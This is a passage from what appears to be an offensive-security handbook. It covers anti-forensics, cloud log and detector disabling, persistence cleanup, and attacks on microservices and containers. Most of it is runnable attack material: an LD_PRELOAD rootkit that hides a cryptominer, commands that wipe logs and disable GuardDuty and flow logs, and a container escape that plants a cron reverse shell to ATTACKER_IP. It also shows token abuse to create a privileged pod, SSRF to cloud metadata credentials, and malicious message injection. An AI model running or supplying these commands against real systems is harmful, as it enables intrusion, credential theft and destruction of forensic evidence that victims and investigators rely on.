# Match legitimate file timestamps
$legitFile = Get-Item "C:\Windows\System32\notepad.exe"
$suspiciousFile = Get-Item "C:\suspicious\file.exe"
$suspiciousFile.CreationTime = $legitFile.CreationTime
$suspiciousFile.LastWriteTime = $legitFile.LastWriteTime
$suspiciousFile.LastAccessTime = $legitFile.LastAccessTime
```

**Cloud Resource Timestamp Obfuscation** [Inference - Cloud providers track creation times internally; modification affects visible metadata but not internal audit trails]

```bash
# AWS: Modify instance tags to appear legitimate
aws ec2 create-tags \
  --resources i-attacker-instance \
  --tags Key=LaunchDate,Value=2024-01-15 \
  --profile compromised

# Azure: Update resource tags
az resource tag \
  --ids /subscriptions/.../resourceGroups/.../providers/Microsoft.Compute/virtualMachines/vm-name \
  --tags CreatedDate=2024-01-15 Purpose=Production

# Note: Actual creation timestamps in CloudTrail/Activity Logs cannot be modified
```

### Advanced Evasion Techniques

**Anti-Forensics - Secure Deletion**

```bash
# Secure file deletion with shred
shred -vfz -n 10 /sensitive-file.txt

# Wipe entire directory
find /compromised-directory -type f -exec shred -vfz -n 3 {} \;
rm -rf /compromised-directory

# Overwrite free space to destroy deleted file remnants
dd if=/dev/zero of=/root/fillfile bs=1M
rm -f /root/fillfile

# srm (secure remove) - overwrites before deletion
srm -vz /sensitive-file.txt

# wipe tool
wipe -rf /compromised-directory

# For SSDs (TRIM support needed)
blkdiscard /dev/sda1
```

**Memory/Swap Cleanup**

```bash
# Clear swap space
swapoff -a
dd if=/dev/zero of=/dev/sda5 bs=1M  # Assuming sda5 is swap
mkswap /dev/sda5
swapon -a

# Clear memory caches
sync
echo 3 > /proc/sys/vm/drop_caches

# Disable core dumps (prevent memory forensics)
ulimit -c 0
echo "* hard core 0" >> /etc/security/limits.conf

# Clear crash dumps
rm -rf /var/crash/*
rm -rf /var/core/*
```

**Process Hiding** [Unverified - effectiveness varies by kernel version and security tools]

```bash
# LD_PRELOAD rootkit (hides processes)
# libprocesshider.c (simplified example)
cat > libprocesshider.c <<'EOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>

static const char* process_to_hide = "xmrig";

struct dirent* (*original_readdir)(DIR*) = NULL;

struct dirent* readdir(DIR *dirp) {
    if (!original_readdir) {
        original_readdir = dlsym(RTLD_NEXT, "readdir");
    }
    
    struct dirent* dir;
    while ((dir = original_readdir(dirp)) != NULL) {
        if (strstr(dir->d_name, process_to_hide) == NULL) {
            break;
        }
    }
    return dir;
}
EOF

gcc -Wall -fPIC -shared -o libprocesshider.so libprocesshider.c -ldl
echo "/path/to/libprocesshider.so" >> /etc/ld.so.preload

# Kernel module rootkit (more advanced, requires root)
# Hides processes, files, network connections
# Example: Diamorphine, Reptile, or custom LKM
```

**Network Connection Hiding**

```bash
# Clear netstat-related data structures (requires kernel manipulation)
# Alternative: Hide connections via iptables + routing

# Redirect traffic through innocent-looking connections
ssh -D 1080 -f -C -q -N legitimate-server.com
# Use SOCKS proxy for malicious traffic

# IPTables rules to hide outbound connections
iptables -t nat -A OUTPUT -p tcp --dport 443 -j DNAT --to-destination attacker-ip:443
iptables -A OUTPUT -d attacker-ip -j DROP  # Prevents appearing in netstat

# Use established connections (harder to detect)
# Piggyback on legitimate HTTP/HTTPS connections
```

### Cloud-Specific Track Removal

**AWS GuardDuty Evasion**

```bash
# Disable GuardDuty
aws guardduty list-detectors --profile compromised
# Returns: detector-id
aws guardduty delete-detector --detector-id abc123 --profile compromised

# Suppress findings
aws guardduty create-filter \
  --detector-id abc123 \
  --name ignore-findings \
  --finding-criteria '{"Criterion":{"type":{"Eq":["UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration"]}}}' \
  --action ARCHIVE \
  --profile compromised

# Delete threat intel sets
aws guardduty delete-threat-intel-set \
  --detector-id abc123 \
  --threat-intel-set-id xyz789 \
  --profile compromised
```

**Azure Security Center Manipulation**

```bash
# Disable security alerts
az security alert update \
  --location centralus \
  --name alert-name \
  --status Dismissed

# Remove security contacts
az security contact delete --name default

# Disable security policy
az policy assignment delete \
  --name 'ASC Default' \
  --scope /subscriptions/SUBSCRIPTION_ID
```

**GCP Security Command Center Evasion**

```bash
# Mute findings
gcloud scc findings update FINDING_NAME \
  --mute MUTED

# Delete notification configs
gcloud scc notifications delete NOTIFICATION_CONFIG

# Disable Security Health Analytics
gcloud services disable securitycenter.googleapis.com
```

**VPC Flow Logs Manipulation**

```bash
# AWS: Disable VPC Flow Logs
aws ec2 describe-flow-logs --profile compromised
aws ec2 delete-flow-logs --flow-log-ids fl-abc123 --profile compromised

# Azure: Disable NSG flow logs
az network watcher flow-log delete \
  --location eastus \
  --name nsg-flow-log

# GCP: Delete VPC flow log configuration
gcloud compute networks subnets update SUBNET_NAME \
  --no-enable-flow-logs \
  --region REGION
```

**S3 Access Logging Disable**

```bash
# Check if bucket has logging enabled
aws s3api get-bucket-logging --bucket target-bucket --profile compromised

# Disable access logging
aws s3api put-bucket-logging \
  --bucket target-bucket \
  --bucket-logging-status '{}' \
  --profile compromised

# Delete existing logs
aws s3 rm s3://logging-bucket/logs/ --recursive --profile compromised
```

### Credential and Access Cleanup

**Remove Backdoor Access Methods**

```bash
# AWS: Remove IAM backdoors
aws iam list-users --profile compromised | jq -r '.Users[].UserName' | \
  grep -i "backdoor\|test\|temp" | \
  xargs -I {} aws iam delete-user --user-name {} --profile compromised

# Delete access keys
aws iam list-access-keys --user-name compromised-user --profile compromised
aws iam delete-access-key \
  --user-name compromised-user \
  --access-key-id AKIA... \
  --profile compromised

# Remove from groups
aws iam remove-user-from-group \
  --user-name compromised-user \
  --group-name Administrators \
  --profile compromised

# Delete IAM roles
aws iam delete-role --role-name backdoor-role --profile compromised

# Detach policies first
aws iam list-attached-role-policies --role-name backdoor-role --profile compromised
aws iam detach-role-policy \
  --role-name backdoor-role \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
  --profile compromised
```

**SSH Key Cleanup (All Systems)**

```bash
# Remove from authorized_keys across all users
find /home -name "authorized_keys" -type f -exec sed -i '/attacker-public-key/d' {} \;
sed -i '/attacker-public-key/d' /root/.ssh/authorized_keys

# Remove SSH host keys knowledge (on attacker machine)
ssh-keygen -R target-hostname
sed -i '/target-ip/d' ~/.ssh/known_hosts

# Clear SSH logs
cat /dev/null > /var/log/auth.log
journalctl --rotate && journalctl --vacuum-time=1s
```

**API Token/Key Rotation** [Inference - forces old compromised credentials to become invalid]

```bash
# AWS: Rotate access keys
new_key=$(aws iam create-access-key --user-name legitimate-user --query 'AccessKey' --output json)
aws iam delete-access-key --access-key-id OLD_KEY_ID --user-name legitimate-user

# Azure: Regenerate storage keys
az storage account keys renew \
  --account-name storageacct \
  --key primary

# GCP: Rotate service account keys
gcloud iam service-accounts keys create new-key.json \
  --iam-account=service-account@project.iam.gserviceaccount.com
gcloud iam service-accounts keys delete OLD_KEY_ID \
  --iam-account=service-account@project.iam.gserviceaccount.com

# Kubernetes: Rotate service account tokens
kubectl delete secret service-account-token-xxxxx -n namespace
# Token automatically regenerates
```

### Persistence Removal

**Systemd Service Cleanup (Linux)**

```bash
# List suspicious services
systemctl list-unit-files | grep -E "enabled|static" | \
  grep -v -E "^(systemd|dbus|network|ssh|cron)" | awk '{print $1}'

# Disable and remove malicious services
systemctl stop system-updates.service
systemctl disable system-updates.service
rm /etc/systemd/system/system-updates.service
systemctl daemon-reload
systemctl reset-failed

# Clean up timers
systemctl list-timers --all
systemctl stop malicious.timer
systemctl disable malicious.timer
rm /etc/systemd/system/malicious.timer
```

**Cron Job Removal**

```bash
# Check all users' cron jobs
for user in $(cut -f1 -d: /etc/passwd); do
  echo "=== $user ==="
  crontab -u $user -l 2>/dev/null
done

# Remove specific entries
crontab -l | grep -v "attacker-script.sh" | crontab -

# Clean system-wide cron
rm -f /etc/cron.d/backdoor
rm -f /etc/cron.daily/mining
rm -f /etc/cron.hourly/exfiltrate

# Check cron logs for persistence indicators
grep -i "cron\|anacron" /var/log/syslog | grep -v "legitimate-job"
```

**Windows Scheduled Task Removal**

```powershell
# List all scheduled tasks
Get-ScheduledTask | Where-Object {$_.State -eq "Ready"}

# Remove malicious tasks
Unregister-ScheduledTask -TaskName "SystemUpdate" -Confirm:$false
Unregister-ScheduledTask -TaskPath "\Microsoft\Windows\Backdoor\" -Confirm:$false

# Clear Task Scheduler history
wevtutil cl "Microsoft-Windows-TaskScheduler/Operational"

# Remove WMI event subscriptions (advanced persistence)
Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object {$_.Name -like "*Backdoor*"} | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class __EventConsumer | Where-Object {$_.Name -like "*Backdoor*"} | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Remove-WmiObject
```

**Registry Persistence Removal (Windows)**

```powershell
# Common persistence locations
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Backdoor"
Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SystemUpdater"

# Service persistence
Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\MaliciousService" -Recurse

# Winlogon persistence
Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell"
Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit"

# AppInit_DLLs persistence
Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" -Name "AppInit_DLLs"

# Image File Execution Options (IFEO) debugger hijack
Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" -Recurse
```

**Container Persistence Removal**

```bash
# Remove malicious Kubernetes resources
kubectl delete deployment system-monitor -n kube-system
kubectl delete daemonset backdoor -n kube-system
kubectl delete cronjob exfiltrator -n kube-system

# Remove service accounts with excessive permissions
kubectl delete serviceaccount backdoor-sa -n kube-system
kubectl delete clusterrolebinding backdoor-binding

# Remove malicious init containers
kubectl get pods --all-namespaces -o json | \
  jq -r '.items[] | select(.spec.initContainers[]?.image | contains("attacker")) | "\(.metadata.namespace) \(.metadata.name)"' | \
  while read ns pod; do kubectl delete pod $pod -n $ns; done

# Docker: Remove malicious containers and images
docker ps -a | grep "attacker\|miner" | awk '{print $1}' | xargs docker rm -f
docker images | grep "attacker\|xmrig" | awk '{print $3}' | xargs docker rmi -f
```

### Advanced Anti-Forensics

**File System Journal Manipulation** [Unverified - requires root and may cause filesystem corruption]

```bash
# Ext4 journal manipulation
debugfs -w /dev/sda1
debugfs: logdump -a  # View journal
# Clearing journal (extreme - can corrupt filesystem)
tune2fs -O ^has_journal /dev/sda1
tune2fs -O has_journal /dev/sda1

# Alternative: Mount with noatime, nodiratime to reduce forensic traces
mount -o remount,noatime,nodiratime /

# XFS log zeroing
xfs_db -x -c "logzero" /dev/sda1
```

**Slack Space Data Hiding/Cleaning**

```bash
# Wipe slack space in files
python3 << 'EOF'
import os

def wipe_slack_space(filepath):
    # Get actual file size
    size = os.path.getsize(filepath)
    # Get block size
    stat = os.statvfs(filepath)
    block_size = stat.f_bsize
    # Calculate slack space
    slack = block_size - (size % block_size)
    if slack > 0 and slack < block_size:
        # Write zeros to slack
        with open(filepath, 'ab') as f:
            f.write(b'\x00' * slack)
        # Truncate back to original
        os.truncate(filepath, size)

# Apply to all files in directory
for root, dirs, files in os.walk('/target'):
    for file in files:
        wipe_slack_space(os.path.join(root, file))
EOF
```

**Metadata Scrubbing**

```bash
# Remove EXIF data from images (if exfiltrated with metadata)
exiftool -all= image.jpg
exiftool -all= -r /directory/

# PDF metadata removal
exiftool -all= document.pdf
qpdf --linearize --object-streams=generate input.pdf output.pdf

# Office document metadata
exiftool -all= document.docx

# Verify removal
exiftool -a -G1 cleaned-file.jpg
```

**Network Forensics Cleanup**

```bash
# Clear ARP cache
ip -s -s neigh flush all

# Clear routing table cache
ip route flush cache

# Remove pcap files if packet capture was running
find /var/log -name "*.pcap" -delete
find /tmp -name "*.pcap" -delete

# Clear DNS cache
systemd-resolve --flush-caches
service nscd restart  # If using nscd

# Remove Wireshark/tcpdump temporary files
rm -f /tmp/wireshark* /tmp/tcpdump*
```

### Verification and Validation

**Post-Cleanup Verification Script**

```bash
#!/bin/bash
# verify_cleanup.sh

echo "=== Checking for remaining artifacts ==="

# Check for mining processes
echo "[*] Mining processes:"
ps aux | grep -iE "xmrig|minergate|cpuminer|ethminer" | grep -v grep

# Check for suspicious network connections
echo "[*] Suspicious connections:"
netstat -tunap | grep -E ":[0-9]{4,5}" | grep -vE ":(22|80|443|3306|5432)"

# Check for modified system files
echo "[*] Recently modified system files:"
find /etc /usr/local/bin /opt -type f -mtime -7 -ls 2>/dev/null

# Check for unauthorized users
echo "[*] Recent user additions:"
grep -E "$(date -d '7 days ago' +%Y%m%d)" /var/log/auth.log | grep useradd

# Check for suspicious cron jobs
echo "[*] Cron jobs:"
for user in $(cut -f1 -d: /etc/passwd); do
  crontab -u $user -l 2>/dev/null | grep -v "^#"
done

# Check for hidden files
echo "[*] Hidden files in sensitive locations:"
find /tmp /var/tmp /dev/shm -name ".*" -type f 2>/dev/null

# Check listening ports
echo "[*] Listening services:"
ss -tlnp | grep LISTEN

# Check for LD_PRELOAD rootkits
echo "[*] LD_PRELOAD check:"
cat /etc/ld.so.preload 2>/dev/null

# Check loaded kernel modules
echo "[*] Recently loaded kernel modules:"
lsmod | head -20

echo "=== Verification complete ==="
```

**Cloud Audit Trail Verification**

```bash
# AWS: Verify CloudTrail is active and not tampered
aws cloudtrail describe-trails --profile compromised
aws cloudtrail get-trail-status --name trail-name --profile compromised

# Check for stop-logging events
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=StopLogging \
  --max-results 50 \
  --profile compromised

# Azure: Verify Activity Log collection
az monitor diagnostic-settings list --resource target-resource-id

# GCP: Verify audit logging is enabled
gcloud logging sinks list
gcloud projects get-iam-policy PROJECT_ID
```

**IOC (Indicators of Compromise) Removal Checklist**

```bash
# Create checklist for systematic cleanup
cat > cleanup_checklist.txt <<'EOF'
[ ] AWS/Azure/GCP unauthorized users removed
[ ] Rogue access keys deleted
[ ] Backdoor EC2/VM instances terminated
[ ] Security groups returned to baseline
[ ] Lambda/Function apps cleaned
[ ] S3/Storage buckets audited and cleaned
[ ] CloudTrail/Activity logs checked for gaps
[ ] Mining software processes killed
[ ] Mining software binaries removed
[ ] Systemd services/Windows services cleaned
[ ] Cron/Scheduled tasks removed
[ ] SSH authorized_keys cleaned
[ ] Log files cleared/sanitized
[ ] Bash/PowerShell history cleared
[ ] Timestamps normalized
[ ] Network connections closed
[ ] Firewall rules reset
[ ] Container images removed
[ ] Kubernetes resources deleted
[ ] File system artifacts wiped
[ ] Memory/swap cleared
[ ] Registry keys removed (Windows)
[ ] WMI persistence removed (Windows)
[ ] Post-cleanup verification run
EOF

cat cleanup_checklist.txt
```

---

**Critical Subtopics for Advanced Post-Exploitation:**

- **Lateral Movement techniques** (pass-the-hash, token impersonation, Kerberos attacks in hybrid cloud)
- **Data exfiltration methods** (DNS tunneling, steganography, encrypted channels)
- **Persistence mechanisms** (bootkit, UEFI implants, hardware implants for physical access scenarios)
- **Counter-incident response** (monitoring detection systems, SIEM evasion, honeypot identification)

---

# Cloud-Native Application Security

## Microservices Exploitation

### Microservices Architecture Reconnaissance

**Service Discovery**

```bash
# Common service discovery endpoints
curl http://target.com:8500/v1/catalog/services  # Consul
curl http://target.com:2379/v2/keys              # etcd
curl http://target.com:8761/eureka/apps          # Eureka

# Consul enumeration
curl http://consul.target.com:8500/v1/catalog/services | jq .
curl http://consul.target.com:8500/v1/catalog/nodes | jq .
curl http://consul.target.com:8500/v1/agent/services | jq .

# etcd enumeration
curl http://etcd.target.com:2379/v2/keys?recursive=true | jq .
curl http://etcd.target.com:2379/v2/keys/_coreos.com | jq .

# Kubernetes service discovery
curl http://target.com:8001/api/v1/services
curl http://target.com:8001/api/v1/namespaces/default/services
curl http://target.com:8001/api/v1/endpoints
```

**Docker Registry Enumeration**

```bash
# List repositories in Docker registry
curl https://registry.target.com/v2/_catalog

# Get tags for specific image
curl https://registry.target.com/v2/SERVICE_NAME/tags/list

# Pull image manifest
curl https://registry.target.com/v2/SERVICE_NAME/manifests/latest

# Download image layers
curl -L https://registry.target.com/v2/SERVICE_NAME/blobs/sha256:HASH \
     -o layer.tar.gz

# Extract and analyze
tar -xzf layer.tar.gz
grep -r "password\|secret\|api_key" .
```

**DNS Service Discovery**

```bash
# DNS-based service discovery (DNS-SD)
dig @dns.target.com _services._dns-sd._udp.target.com PTR

# Common microservice subdomains
for service in auth user payment order inventory notification; do
    dig ${service}.target.com +short
    dig ${service}-service.target.com +short
    dig ${service}-api.target.com +short
done

# Kubernetes internal DNS
dig @kube-dns.kube-system.svc.cluster.local \
    service-name.namespace.svc.cluster.local

# Consul DNS interface
dig @consul.target.com service-name.service.consul SRV
```

**Port Scanning for Microservices**

```bash
# Common microservice ports
nmap -sV -p 3000,4000,5000,8000,8080,8081,8443,9090,9091 target.com

# gRPC services (common ports)
nmap -sV -p 50051,50052,9000-9010 target.com

# Service mesh control planes
nmap -sV -p 8080,9090,15000,15001,15010,15012,15014 target.com

# Full microservice scan
nmap -sV -p- --open target.com -oA microservices_scan
```

### Inter-Service Communication Exploitation

**Service-to-Service Authentication Bypass**

```bash
# Test for missing authentication between services
curl http://internal-service.target.com:8080/api/users

# Bypass using internal service headers
curl http://api.target.com/users \
     -H "X-Service-Name: payment-service" \
     -H "X-Internal-Request: true"

# JWT validation bypass
curl http://api.target.com/admin \
     -H "Authorization: Bearer EXPIRED_TOKEN" \
     -H "X-Service-Auth: internal"

# Mutual TLS bypass attempt
curl -k http://internal-api.target.com:8080/health
```

**Service Mesh Proxy Bypass**

```bash
# Direct service access bypassing proxy
curl http://service-pod-ip:8080/api/endpoint

# Test if service accepts requests without proxy headers
curl http://backend.target.com:8080/api/users \
     --resolve backend.target.com:8080:10.244.0.5

# Envoy bypass headers
curl http://api.target.com/users \
     -H "x-envoy-internal: true" \
     -H "x-envoy-expected-rq-timeout-ms: 0"
```

**Internal Network Pivot**

```bash
# SSRF to access internal services
curl http://api.target.com/fetch \
     -d "url=http://internal-service:8080/secrets"

# Kubernetes metadata service
curl http://api.target.com/fetch \
     -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Access service mesh control plane
curl http://api.target.com/proxy \
     -d "target=http://istio-pilot.istio-system:15010/debug/endpointz"
```

### Container Escape Techniques

**Docker Socket Access**

```bash
# Check for exposed Docker socket
curl --unix-socket /var/run/docker.sock http://localhost/version

# List containers
curl --unix-socket /var/run/docker.sock http://localhost/containers/json | jq .

# Create privileged container
curl --unix-socket /var/run/docker.sock -X POST \
     -H "Content-Type: application/json" \
     -d '{
           "Image": "alpine",
           "Cmd": ["/bin/sh"],
           "Privileged": true,
           "HostConfig": {
             "Binds": ["/:/host"],
             "Privileged": true
           }
         }' \
     http://localhost/containers/create

# Start container
curl --unix-socket /var/run/docker.sock -X POST \
     http://localhost/containers/CONTAINER_ID/start
```

**Kubernetes ServiceAccount Token Abuse**

```bash
# Read ServiceAccount token from container
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
APISERVER=https://kubernetes.default.svc

# List pods in namespace
curl --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
     $APISERVER/api/v1/namespaces/default/pods | jq .

# List secrets
curl --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
     $APISERVER/api/v1/namespaces/default/secrets | jq .

# Read specific secret
curl --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
     $APISERVER/api/v1/namespaces/default/secrets/SECRET_NAME | jq .

# Create privileged pod
cat <<EOF > malicious-pod.json
{
  "apiVersion": "v1",
  "kind": "Pod",
  "metadata": {"name": "escape-pod"},
  "spec": {
    "hostPID": true,
    "hostNetwork": true,
    "containers": [{
      "name": "escape",
      "image": "alpine",
      "command": ["/bin/sh"],
      "stdin": true,
      "securityContext": {"privileged": true},
      "volumeMounts": [{
        "name": "host",
        "mountPath": "/host"
      }]
    }],
    "volumes": [{
      "name": "host",
      "hostPath": {"path": "/"}
    }]
  }
}
EOF

curl --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -X POST -d @malicious-pod.json \
     $APISERVER/api/v1/namespaces/default/pods
```

**Privileged Container Escape**

```bash
# Check if running as privileged
grep CapEff /proc/self/status

# Mount host filesystem
mkdir /mnt/host
mount /dev/sda1 /mnt/host

# Access host files
cat /mnt/host/etc/shadow
cat /mnt/host/root/.ssh/id_rsa

# Write cron job on host
echo '* * * * * root bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> \
     /mnt/host/etc/crontab
```

**CVE-2019-5736 (runC Container Escape)**

[Unverified] This exploitation requires specific conditions and vulnerable runC versions (< 1.0-rc6):

```bash
# Check runC version
runc --version

# Exploit requires:
# 1. Ability to execute docker exec
# 2. Vulnerable runC version
# 3. Overwrite /bin/sh in container

# Detection
find / -name runc 2>/dev/null
strings /usr/bin/runc | grep "1.0-rc"

# Exploit available at:
# https://github.com/Frichetten/CVE-2019-5736-PoC
```

### Microservices API Enumeration

**Service Endpoint Discovery**

```bash
# Swagger/OpenAPI endpoints
curl http://service.target.com:8080/swagger.json
curl http://service.target.com:8080/v2/api-docs
curl http://service.target.com:8080/api-docs
curl http://service.target.com:8080/openapi.json

# Spring Boot Actuator
curl http://service.target.com:8080/actuator
curl http://service.target.com:8080/actuator/health
curl http://service.target.com:8080/actuator/env
curl http://service.target.com:8080/actuator/metrics
curl http://service.target.com:8080/actuator/mappings
curl http://service.target.com:8080/actuator/beans

# Health check endpoints
curl http://service.target.com:8080/health
curl http://service.target.com:8080/healthz
curl http://service.target.com:8080/ready
curl http://service.target.com:8080/live

# Metrics endpoints
curl http://service.target.com:8080/metrics
curl http://service.target.com:9090/metrics  # Prometheus format
```

**Spring Boot Actuator Exploitation**

```bash
# Environment exposure
curl http://service.target.com:8080/actuator/env | jq .

# Extract sensitive properties
curl http://service.target.com:8080/actuator/env | \
     grep -i "password\|secret\|key\|token"

# Heap dump (memory dump)
curl http://service.target.com:8080/actuator/heapdump -o heap.dump

# Analyze heap dump
jhat heap.dump
# Access at http://localhost:7000

# Or use Eclipse Memory Analyzer
mat heap.dump

# Thread dump
curl http://service.target.com:8080/actuator/threaddump

# Loggers endpoint (change log level)
curl -X POST http://service.target.com:8080/actuator/loggers/ROOT \
     -H "Content-Type: application/json" \
     -d '{"configuredLevel":"DEBUG"}'

# Shutdown endpoint
curl -X POST http://service.target.com:8080/actuator/shutdown
```

**gRPC Service Enumeration**

```bash
# Install grpcurl
go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest

# List services
grpcurl -plaintext service.target.com:50051 list

# List methods for service
grpcurl -plaintext service.target.com:50051 list package.ServiceName

# Describe service
grpcurl -plaintext service.target.com:50051 describe package.ServiceName

# Call method with reflection
grpcurl -plaintext -d '{"user_id": 1}' \
        service.target.com:50051 \
        package.ServiceName/GetUser

# Without reflection (using proto file)
grpcurl -import-path ./protos -proto service.proto \
        -d '{"user_id": 1}' \
        service.target.com:50051 \
        package.ServiceName/GetUser

# Test for authentication bypass
grpcurl -plaintext -H "Authorization: Bearer FAKE_TOKEN" \
        -d '{"user_id": 1}' \
        service.target.com:50051 \
        package.ServiceName/GetUser
```

**GraphQL Microservice Testing**

```bash
# GraphQL introspection on microservice
curl -X POST http://graphql-service.target.com:8080/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{__schema{types{name}}}"}'

# Federation schema query
curl -X POST http://gateway.target.com:4000/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{_service{sdl}}"}'

# Query subgraph directly
curl -X POST http://user-service.target.com:8080/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{ users { id email password } }"}'
```

### Service Dependency Chain Attacks

**Dependency Confusion**

```bash
# Identify internal package registries
cat package.json | grep registry
cat requirements.txt | grep index-url
cat pom.xml | grep repository

# Test private registry access
curl http://npm.internal.target.com/PACKAGE_NAME
curl http://pypi.internal.target.com/simple/PACKAGE_NAME/

# Upload malicious package to public registry
# with same name as private package (higher version)
npm publish --registry https://registry.npmjs.org
```

**Supply Chain Poisoning**

```bash
# Analyze container image layers
docker pull registry.target.com/service:latest
docker history registry.target.com/service:latest

# Extract filesystem
docker save registry.target.com/service:latest -o service.tar
tar -xf service.tar

# Search for secrets in layers
for layer in */layer.tar; do
    echo "Analyzing $layer"
    tar -xf "$layer" -C temp/
    grep -r "password\|secret\|key" temp/
    rm -rf temp/*
done

# Check for vulnerable dependencies
docker run --rm -v /var/run/docker.sock:/var/run/docker.sock \
           aquasec/trivy image registry.target.com/service:latest
```

### Message Queue Exploitation

**RabbitMQ Enumeration**

```bash
# Default credentials
curl -u guest:guest http://rabbitmq.target.com:15672/api/overview

# List vhosts
curl -u admin:password http://rabbitmq.target.com:15672/api/vhosts | jq .

# List exchanges
curl -u admin:password http://rabbitmq.target.com:15672/api/exchanges | jq .

# List queues
curl -u admin:password http://rabbitmq.target.com:15672/api/queues | jq .

# Get messages from queue
curl -u admin:password -X POST \
     http://rabbitmq.target.com:15672/api/queues/%2F/QUEUE_NAME/get \
     -H "Content-Type: application/json" \
     -d '{"count":10,"ackmode":"ack_requeue_false","encoding":"auto"}'

# Publish malicious message
curl -u admin:password -X POST \
     http://rabbitmq.target.com:15672/api/exchanges/%2F/EXCHANGE/publish \
     -H "Content-Type: application/json" \
     -d '{
           "properties":{},
           "routing_key":"QUEUE_NAME",
           "payload":"{\"user_id\":1,\"role\":\"admin\"}",
           "payload_encoding":"string"
         }'
```

**Kafka Enumeration**

```bash
# Install kafka tools
wget https://archive.apache.org/dist/kafka/3.5.0/kafka_2.13-3.5.0.tgz
tar -xzf kafka_2.13-3.5.0.tgz
cd kafka_2.13-3.5.0

# List topics
bin/kafka-topics.sh --bootstrap-server kafka.target.com:9092 --list

# Describe topic
bin/kafka-topics.sh --bootstrap-server kafka.target.com:9092 \
                    --describe --topic TOPIC_NAME

# Consume messages
bin/kafka-console-consumer.sh --bootstrap-server kafka.target.com:9092 \
                               --topic TOPIC_NAME --from-beginning

# Produce malicious message
echo '{"user_id":1,"action":"grant_admin"}' | \
bin/kafka-console-producer.sh --bootstrap-server kafka.target.com:9092 \
                               --topic user-commands

# Using kcat (kafkacat)
apt install kafkacat

# List topics
kafkacat -b kafka.target.com:9092 -L

# Consume
kafkacat -b kafka.target.com:9092 -C -t TOPIC_NAME

# Produce
echo '{"malicious":"payload"}' | kafkacat -b kafka.target.com:9092 -P -t TOPIC_NAME
```

**Redis Pub/Sub Exploitation**

```bash
# Connect to Redis
redis-cli -h redis.target.com -p 6379

# List active channels
redis-cli -h redis.target.com PUBSUB CHANNELS

# Subscribe to channel
redis-cli -h redis.target.com SUBSCRIBE channel:name

# Monitor all commands (requires privileges)
redis-cli -h redis.target.com MONITOR

# Publish malicious message
redis-cli -h redis.target.com PUBLISH channel:name \
          '{"user_id":1,"role":"admin","cmd":"exec"}'

# Check for unauthenticated access
redis-cli -h redis.target.com PING
redis-cli -h redis.target.com INFO
redis-cli -h redis.target.com KEYS *
```

### Distributed Tracing Exploitation

**Jaeger Tracing**

```bash
# Access Jaeger UI
curl http://jaeger.target.com:16686/api/services

# Get traces for service
curl http://jaeger.target.com:16686/api/traces?service=SERVICE_NAME | jq .

# Extract sensitive data from traces
curl http://jaeger.target.com:16686/api/traces?service=auth-service | \
     jq '.data[].spans[].tags[] | select(.key=="http.url" or .key=="sql.query")'

# Find authentication tokens in traces
curl http://jaeger.target.com:16686/api/traces?service=api-gateway | \
     grep -i "authorization\|bearer\|token"
```

**Zipkin Exploitation**

```bash
# Query Zipkin API
curl http://zipkin.target.com:9411/api/v2/services

# Get traces
curl http://zipkin.target.com:9411/api/v2/traces?serviceName=user-service | jq .

# Search for specific span
curl "http://zipkin.target.com:9411/api/v2/traces?annotationQuery=error" | jq .

# Extract credentials from traces
curl http://zipkin.target.com:9411/api/v2/traces | \
     jq '.[].annotations[] | select(.value | contains("password"))'
```

### Configuration Management Exploitation

**Consul Key-Value Store**

```bash
# Read all keys
curl http://consul.target.com:8500/v1/kv/?recurse | jq .

# Read specific key
curl http://consul.target.com:8500/v1/kv/config/database | jq -r '.[0].Value' | base64 -d

# Write malicious configuration
curl -X PUT http://consul.target.com:8500/v1/kv/config/admin \
     -d '{"enabled":true,"bypass_auth":true}'

# List ACL tokens
curl http://consul.target.com:8500/v1/acl/tokens

# Service deregistration
curl -X PUT http://consul.target.com:8500/v1/agent/service/deregister/SERVICE_ID
```

**etcd Exploitation**

```bash
# Read all keys (v2 API)
curl http://etcd.target.com:2379/v2/keys?recursive=true | jq .

# Read specific key
curl http://etcd.target.com:2379/v2/keys/config/database | jq .

# Write key
curl -X PUT http://etcd.target.com:2379/v2/keys/config/admin \
     -d value='{"role":"admin"}'

# Delete key
curl -X DELETE http://etcd.target.com:2379/v2/keys/config/service

# etcd v3 API (requires etcdctl)
ETCDCTL_API=3 etcdctl --endpoints=http://etcd.target.com:2379 get "" --prefix

# Read secrets
ETCDCTL_API=3 etcdctl --endpoints=http://etcd.target.com:2379 \
              get /secrets/database/password
```

---

## Service Mesh Vulnerabilities

### Istio Exploitation

**Istio Control Plane Enumeration**

```bash
# Pilot discovery endpoint
curl http://istio-pilot.istio-system:8080/debug/endpointz | jq .
curl http://istio-pilot.istio-system:8080/debug/edsz | jq .
